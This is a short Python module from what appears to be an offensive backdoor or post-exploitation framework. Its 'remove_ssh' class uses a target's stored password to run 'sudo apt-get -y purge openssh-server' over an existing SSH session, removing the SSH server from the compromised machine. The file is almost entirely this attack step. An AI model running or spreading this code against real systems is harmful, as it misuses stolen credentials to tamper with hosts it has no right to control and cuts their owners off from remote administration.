from backdoor import *

class Remove_ssh(Backdoor):
    prompt = Fore.RED + "remove_ssh" + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
	cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using remove_ssh module..."
        self.core = core
        self.options = { #~Input extra options. You almost always need a port.~
                }
        self.allow_modules = True
        self.modules = {}
        self.help_text = ""

    def get_command(self):
	return str("echo " + self.core.curtarget.pword + " | sudo -S apt-get -y purge openssh-server")
    def do_exploit(self, args):
	self.core.curtarget.ssh.exec_command(self.get_command())


